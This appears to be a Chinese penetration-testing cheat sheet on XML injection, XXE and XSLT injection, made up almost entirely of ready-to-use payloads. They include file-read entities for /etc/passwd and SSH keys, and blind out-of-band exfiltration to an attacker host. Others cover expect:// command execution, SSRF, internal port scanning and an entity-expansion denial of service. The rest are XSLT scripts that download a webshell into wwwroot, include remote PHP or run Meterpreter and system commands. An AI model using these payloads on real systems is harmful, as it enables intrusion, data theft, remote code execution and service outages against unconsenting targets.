	XML设计的宗旨是传输数据，而非显示数据
	XXE=XML外部实体注入、XML=可扩展标记语言
	Xml文件声明
	<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
	DTD为XML的文档类型定义
	引入外部DTD
	<!DOCTYPE 根元素 SYSTEM "filename">
	参数实体+外部实体
	<?xml version="1.0" encoding="utf-8"?>
	<!DOCTYPE test [
		<!ENTITY % file SYSTEM "file:///etc/passwd">
		%file;
	]>
  #### XML注入
	闭合标签，改写xml文件，用户可控，有拼接代码
	<?xml version="1.0" encoding="utf-8"?>
	<manager>
		<admin id="1">
    <username>admin</username>
    <password>admin</password>
    </admin>
    <admin id="2">
    <username>root</username>
    <password>root</password>
    </admin>
	</manager>
	若是password可控，拼接代码形成注入
	admin </password></admin><admin id="3"><name>hack</name><password>hacker</password></admin>
  #### XXE
	https://github.com/AonCyberLabs/xxe-recursive-download
	程序解析XML输入时，未禁止外部实体的加载，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害
  ##### 判断
	回显路径
		<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "test">%remote;]>
	DNSLOG
		http://www.dnslog.cn/
	<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY dtd SYSTEM "http://xxx.dnslog.cn/xxe">]>
	<xxe>&dtd;</xxe>
	Webdav
		存在webdav可使用PROPPATCH、PROPFIND、 LOCK等请求方法接受xml输入形成xxe
	Wsdl使用AWVS测试
  ##### 挖掘
	如遇与xml交互的地方
	<?xml version="1.0" encoding="UTF-8"?> 
	<!DOCTYPE ANY [  
	<!ENTITY test "this is test"> 
	]> 
	<root>&test;</root>
	看是否输出
	检查是否支持外部实体
	<?xml version="1.0" encoding="UTF-8"?> 
   	<!DOCTYPE ANY [  
   	<!ENTITY % foo SYSTEM "http://attacker/evil.xml"> 
   	%foo;
	]> 
	查看你的服务器是否有请求
	JSON content-type XXE
	修改Content-Type: application/xml
	X-Requested-With: XMLHttpRequest
	<?xml version="1.0" encoding="UTF-8" ?>
	<!DOCTYPE netspi [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
	<root>
	<参数name>name</参数name>
	<参数value>&xxe;</ 参数value>
	</root>

	<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>

	<?xml version="1.0"?>
	<!DOCTYPE data [
	<!ELEMENT data (#ANY)>
	<!ENTITY file SYSTEM "file:///etc/passwd">
	]>
	<data>&file;</data>

	<?xml version="1.0" encoding="ISO-8859-1"?>
	<!DOCTYPE foo [  
	<!ELEMENT foo ANY >
	<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>

	<?xml version="1.0" encoding="ISO-8859-1"?>
	<!DOCTYPE foo [  
	<!ELEMENT foo ANY >
	<!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
  ##### 有回显读取本地文件
	<?xml version="1.0" encoding="utf-8"?> 
	<!DOCTYPE creds [  
	<!ENTITY goodies SYSTEM "file:////etc/passwd"> ]> 
	<creds>&goodies;</creds>
	也可去掉文件列目录
	file:///root/.sh/id_rsa
	特殊字符
	<?xml version="1.0" encoding="utf-8"?> 
	<!DOCTYPE roottag [
	<!ENTITY % start "<![CDATA[">   
	<!ENTITY % goodies SYSTEM "file:////tmp/xxx.txt">  
	<!ENTITY % end "]]>">  
	<!ENTITY % dtd SYSTEM "http://attacker/evil.dtd"> 
	%dtd; ]> 
	<roottag>&all;</roottag>
	evil.dtd
	<?xml version="1.0" encoding="UTF-8"?> 
	<!ENTITY all "%start;%goodies;%end;">
  ##### Blind OOB XXE无回显读取
	需使用参数实体，引用外部DTD
	Payload
	<!DOCTYPE convert [ 
	<!ENTITY % remote SYSTEM "http://ip/test.dtd">
	%remote;%int;%send;
	]>
	test.dtd
	<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
	<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://attacker:9999?p=%file;'>">
  ##### 列目录
	远程payload
	<!ENTITY % a SYSTEM "file:///"> <!ENTITY % b "<!ENTITY &#37; c SYSTEM 'gopher://ip:80/%a;'>"> %b; %c;
	注入payload
	<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker:80/1.xml">%remote;]><root/>

	不同平台支持的协议
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/11.png)

  ##### 执行命令
	安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。
	<?xml version="1.0" encoding="utf-8"?>
	<!DOCTYPE xxe [
	<!ELEMENT name ANY >
	<!ENTITY xxe SYSTEM "expect://id" >]>
	<root>
	<name>&xxe;</name>
	</root>
  ##### 内网主机探测
	可先读取/etc/network/interfaces、/proc/net/arp、/etc/hosts等文件查询IP段
	使用脚本
  ##### 内网端口扫描
	<?xml version="1.0" encoding="utf-8"?>  
	<!DOCTYPE data SYSTEM "http://127.0.0.1:515/" [  
	<!ELEMENT data (#PCDATA)>  
	]>
	<data>4</data>
	可使用burpsuite的intruder模块进行遍历
  ##### 内部DTD利用
	Linux
	<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
	<!ENTITY % ISOamsa 'Your DTD code'>
	%local_dtd;
	Windows
	<!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
	<!ENTITY % SuperClass '>Your DTD code<!ENTITY test "test"'>
	%local_dtd;
	<?xml version="1.0" ?>
	<!DOCTYPE message [
	<!ENTITY % local_dtd SYSTEM "file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd">

	<!ENTITY % condition 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

	%local_dtd;
	]>
	<message>any text</message>
  ##### XXE写shell
	当XXE支持XSL时
	<?xml version='1.0'?>
	<xsl:stylesheet version="1.0"
	xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
	xmlns:msxsl="urn:schemas-microsoft-com:xslt"
	xmlns:user="http://mycompany.com/mynamespace">
	<msxsl:script language="C#" implements-prefix="user">
	<![CDATA[
	public string xml()
	{
	    System.Net.WebClient webClient = new System.Net.WebClient();
	    webClient.DownloadFile("https://x.x.x.x/shell.txt",
                       @"c:\inetpub\wwwroot\shell.aspx");
	
	return "Exploit Success";
	}
	]]>
	</msxsl:script>
	<xsl:template match="/">
	<xsl:value-of select="user:xml()"/>
	</xsl:template>
	</xsl:stylesheet>
  ##### XXE 进行 SSRF
	<?xml version="1.0" encoding="ISO-8859-1"?>
	<!DOCTYPE foo [
	<!ELEMENT foo ANY >
	<!ENTITY % xxe SYSTEM "http://internal.service/secret_pass.txt" >
	]>
	<foo>&xxe;</foo>
  ##### XXE 进行拒绝服务攻击
  	<!DOCTYPE data [
	<!ENTITY a0 "dos" >
	<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
	<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
	<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
	<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
	]>
	<data>&a4;</data>
  ##### 基于报错的XXE
  	PAYLOAD:
  	<?xml version="1.0" ?>
	<!DOCTYPE message [
	    <!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
	    %ext;
	]>
	ext.dtd 的内容
	<!ENTITY % file SYSTEM "file:///etc/passwd">
	<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
	%eval;
	%error;
	<message></message>
  ##### 工具
  	https://github.com/staaldraad/xxeserv
	https://github.com/lc/230-OOB
	https://github.com/enjoiz/XXEinjector
	https://github.com/BuffaloWill/oxml_xxe
	https://github.com/whitel1st/docem
	http://www.beneaththewaves.net/Software/On_The_Outside_Reaching_In.html
  #### XSLT注入
  ##### 确定版本
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
	<xsl:value-of select="system-property('xsl:vendor')"/>
  </xsl:template>
</xsl:stylesheet>
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<br />Version: <xsl:value-of select="system-property('xsl:version')" />
<br />Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br />Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
</body>
</html>
```
  ##### 外部实体
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "C:\secretfruit.txt">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    Fruits &ext_file;:
    <!-- Loop for each fruit -->
    <xsl:for-each select="fruit">
      <!-- Print name: description -->
      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
    </xsl:for-each>
  </xsl:template>

</xsl:stylesheet>
```
  ##### 读取文件和SSRF
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    <xsl:copy-of select="document('http://172.16.132.1:25')"/>
    <xsl:copy-of select="document('/etc/passwd')"/>
    <xsl:copy-of select="document('file:///c:/winnt/win.ini')"/>
    Fruits:
	    <!-- Loop for each fruit -->
    <xsl:for-each select="fruit">
      <!-- Print name: description -->
      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>
```
  ##### 使用嵌入式脚本块远程执行代码
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="urn:my-scripts">

<msxsl:script language = "C#" implements-prefix = "user">
<![CDATA[
public string execute(){
System.Diagnostics.Process proc = new System.Diagnostics.Process();
proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";
proc.StartInfo.RedirectStandardOutput = true;
proc.StartInfo.UseShellExecute = false;
proc.StartInfo.Arguments = "/c dir";
proc.Start();
proc.WaitForExit();
return proc.StandardOutput.ReadToEnd();
}
]]>
</msxsl:script>

  <xsl:template match="/fruits">
  --- BEGIN COMMAND OUTPUT ---
	<xsl:value-of select="user:execute()"/>
  --- END COMMAND OUTPUT ---	
  </xsl:template>
</xsl:stylesheet>
```
  ##### 使用 PHP wrapper执行远程代码
	执行函数readfile
```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<xsl:value-of select="php:function('readfile','index.php')" />
</body>
</html>
```
	执行函数scandir
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
        <xsl:template match="/">
                <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
        </xsl:template>
</xsl:stylesheet>
```
	使用assert执行远程php文件
```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
		<xsl:variable name="payload">
			include("http://10.10.10.10/test.php")
		</xsl:variable>
		<xsl:variable name="include" select="php:function('assert',$payload)"/>
</body>
</html>
```
	执行 PHP Meterpreter
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
        <xsl:template match="/">
                <xsl:variable name="eval">
                        eval(base64_decode('Base64-encoded Meterpreter code'))
                </xsl:variable>
                <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
        </xsl:template>
</xsl:stylesheet>
```
	使用 Java 远程执行代码
```xml
  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
    <xsl:template match="/">
      <xsl:variable name="rtobject" select="rt:getRuntime()"/>
      <xsl:variable name="process" select="rt:exec($rtobject,'ls')"/>
      <xsl:variable name="processString" select="ob:toString($process)"/>
      <xsl:value-of select="$processString"/>
    </xsl:template>
  </xsl:stylesheet>
```
```xml
<xml version="1.0"?>
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://saxon.sf.net/java-type">
<xsl:template match="/">
<xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')" xmlns:Runtime="java:java.lang.Runtime"/>
</xsl:template>.
</xsl:stylesheet>
```
	使用本机 .NET 远程执行代码
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:App="http://www.tempuri.org/App">
    <msxsl:script implements-prefix="App" language="C#">
      <![CDATA[
        public string ToShortDateString(string date)
          {
              System.Diagnostics.Process.Start("cmd.exe");
              return "01/01/2001";
          }
      ]]>
    </msxsl:script>
    <xsl:template match="ArrayOfTest">
      <TABLE>
        <xsl:for-each select="Test">
          <TR>
          <TD>
            <xsl:value-of select="App:ToShortDateString(TestDate)" />
          </TD>
          </TR>
        </xsl:for-each>
      </TABLE>
    </xsl:template>
  </xsl:stylesheet>
```